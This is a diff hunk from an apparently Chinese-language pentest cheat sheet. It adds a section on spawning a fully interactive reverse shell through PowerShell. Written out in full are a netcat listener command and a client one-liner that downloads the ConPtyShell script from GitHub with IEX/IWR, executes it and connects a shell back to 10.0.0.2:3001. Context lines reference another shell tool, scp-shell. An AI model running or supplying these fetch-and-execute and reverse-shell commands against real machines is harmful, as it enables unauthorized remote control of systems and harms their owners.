@@ -446,6 +446,14 @@ sudo ./scp-shell -s -lp 443 -a 192.168.0.189
 ./scp-shell -a 192.168.0.189 -lp 56738 -rp 443
 ```
 
+利用powershell反弹全交互式shell
+```
+# server 
+stty raw -echo; (stty size; cat) | nc -lvnp 3001
+# client
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
+```
+
 ### 内网文件的传输和下载   
 wput 
 ```
